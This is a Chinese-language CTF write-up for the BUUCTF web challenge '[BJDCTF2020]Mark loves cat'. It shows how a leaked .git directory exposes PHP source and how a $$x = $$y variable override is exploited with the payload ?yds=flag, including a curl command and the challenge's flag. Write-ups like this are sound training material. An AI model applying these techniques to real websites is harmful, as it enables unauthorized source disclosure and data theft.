---
title: "[BJDCTF2020]Mark loves cat"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [git-leak, variable-override, php]
vulnerability: Git 源码泄露 + PHP 变量覆盖漏洞
solved: true
flag: "flag{6071ad1c-c6d0-40f0-924b-e221cb77255a}"
---

# [BJDCTF2020]Mark loves cat

## 题目概述
一个个人简历展示网站，页面末尾有可疑的 `dog` 字符串输出。

## 信息收集
1. 访问首页，发现页面末尾输出 `dog`
2. 检测到 `.git/config` 可访问，存在 Git 源码泄露
3. 通过 Git 对象提取获取 `flag.php` 和 `index.php` 源码

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞1：Git 源码泄露**
- `.git` 目录可公开访问
- 可通过解析 Git 对象获取源码

**漏洞2：PHP 变量覆盖**
```php
foreach($_GET as $x => $y){
    $$x = $$y;  // $yds = $flag 当传入 ?yds=flag
}
```
- GET 参数 `$x` 的值作为变量名，`$y` 的值作为另一个变量名
- `?yds=flag` 会让 `$yds = $flag`

**代码逻辑分析：**
```php
// 条件1: 不传 flag 参数时，exit($yds) 输出 "dog"
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
// 条件2: flag=flag 时，exit($is) 输出 "cat"
// 条件3: 其他情况才 echo $flag
```

**绕过思路：**
利用 `$$x = $$y` 将 `$yds` 覆盖为 `$flag` 的值，然后不传 `flag` 参数，触发 `exit($yds)` 输出 flag。

## 利用过程（Payload + Flag）

**Payload：**
```
GET /?yds=flag
```

**原理：**
1. `?yds=flag` → `$yds = $flag`（变量覆盖）
2. 不传 `flag` 参数 → 触发 `exit($yds)`
3. 输出 `$flag` 的值

**获取 Flag：**
```bash
curl -s "http://target/?yds=flag" | tail -1
# flag{6071ad1c-c6d0-40f0-924b-e221cb77255a}
```

## 复现步骤
1. 访问目标站点，检测到 `.git` 泄露
2. 提取 Git 对象获取源码
3. 分析 PHP 代码，发现变量覆盖漏洞
4. 构造 `?yds=flag` 绕过限制获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| Git 泄露 | `/.git/` | 解析 Git 对象 | GitHack/手动提取 |
| 变量覆盖 | GET 参数 | `?yds=flag` | `$$x = $$y` 间接引用 |

## 知识总结（解题技巧、同类题型套路）

1. **Git 泄露检测**：检查 `/.git/config` 是否可访问
2. **变量覆盖利用**：
   - `$$x = $y`：直接覆盖，`?flag=xxx` 让 `$flag = "xxx"`
   - `$$x = $$y`：间接引用，`?yds=flag` 让 `$yds = $flag`
3. **代码审计技巧**：关注 `foreach` + `$$` 组合，分析变量流向和 exit 条件
